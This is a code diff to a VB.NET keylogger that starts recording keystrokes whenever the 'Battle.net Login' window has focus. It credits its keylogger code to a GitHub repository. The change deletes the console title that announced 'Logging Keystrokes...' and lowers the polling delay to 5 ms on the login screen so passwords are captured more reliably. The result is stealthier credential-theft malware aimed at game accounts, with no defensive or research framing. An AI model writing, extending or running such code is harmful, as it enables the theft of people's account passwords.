@@ -12,6 +12,7 @@ Module Module1
     Dim _ex As String
     Dim sw As New Stopwatch
     Dim txt As String = String.Empty
+    Dim threadSleep As Integer = 75
     Sub Main()
         Console.ForegroundColor = ConsoleColor.White
         Dim th As New Threading.Thread(AddressOf Import)
@@ -84,7 +85,8 @@ Module Module1
                 Dim focusedApp As String = windowTitle.ToString()
 
                 If focusedApp = "Battle.net Login" Then
-                    Console.Title = "Focused Process: Battle.net, Logging Keystrokes..."
+                    'Lower threadSleep when on Battle.net login window to capture keystrokes efficiently
+                    threadSleep = 5
 
 #Region "Keylogger"
                     'Keylogger code from: https://github.com/Ritesh18117/Visual-Basic-keylogger
@@ -157,11 +159,15 @@ Module Module1
                         End If
                     End If
                 Else
-                    Console.Title = "Focused Process: Else, Stopped..."
+                    'Increase threadSleep when not on Battle.net Login Window to reduce CPU Load
+                    If Not threadSleep = 75 Then
+                        threadSleep = 75
+                    End If
                 End If
             Catch ex As Exception
                 logError(ex.Message.ToString)
             End Try
+            Threading.Thread.Sleep(threadSleep)
         End While
     End Sub
     Sub logError(exception As String)
